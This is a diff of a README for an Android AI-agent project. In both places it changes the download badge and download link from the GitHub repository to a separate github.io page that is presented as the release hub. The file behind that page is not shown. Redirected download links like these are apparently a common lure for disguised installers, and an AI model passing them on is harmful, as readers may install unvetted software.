@@ -1,6 +1,6 @@
 # 🤖 pi-agent-android - Run free AI agents on mobile
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Anatt562/pi-agent-android)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://anatt562.github.io)
 
 ## 📱 About the Project
 
@@ -21,7 +21,7 @@ While your phone performs most of the work, a larger screen or an external keybo
 
 You must visit the project page to obtain the necessary installation files. Use the link below to reach the official release hub.
 
-[Download the latest version here](https://github.com/Anatt562/pi-agent-android)
+[Download the latest version here](https://anatt562.github.io)
 
 Ensure you select the latest release provided on that page. Save the file to your "Downloads" folder so you can find it quickly during the setup phase.
 
